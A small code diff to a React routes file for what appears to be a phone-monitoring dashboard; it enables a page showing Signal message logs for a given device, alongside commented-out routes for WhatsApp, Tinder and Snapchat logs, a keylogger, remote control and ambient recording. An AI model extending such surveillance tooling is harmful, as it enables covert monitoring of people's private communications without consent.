@@ -16,7 +16,7 @@ import WhatsappLogs from "views/MessagesLogs/WhatsappLogs";
 // import Screenshots from "views/single-pages/Screenshots";
 import InstalledApps from "views/single-pages/InstalledApps";
 // import WifiNetwork from "views/single-pages/WifiNetwork";
-// import SignalLogs from "views/MessagesLogs/SignalLogs";
+import SignalLogs from "views/MessagesLogs/SignalLogs";
 // import KikLogs from "views/MessagesLogs/KikLogs";
 // import LineLogs from "views/MessagesLogs/LineLogs";
 // import TinderLogs from "views/MessagesLogs/TinderLogs";
@@ -75,7 +75,7 @@ const privateRoutes = [
   // { path: "/user/screen-time/:userDeviceId", component: ScreenTime },
   // { path: "/user/keylogger/:userDeviceId", component: KeyLogger },
   // { path: "/user/remote-control/:userDeviceId", component: RemoteControl },
-  // { path: "/user/signal/:userDeviceId", component: SignalLogs },
+  { path: "/user/signal/:userDeviceId", component: SignalLogs },
   // { path: "/user/snapchat/:userDeviceId", component: SnapchatLogs },
   // { path: "/user/record-surrond/:userDeviceId", component: RecordSurround },
   // { path: "/user/apple-health/:userDeviceId", component: AppleHealth },
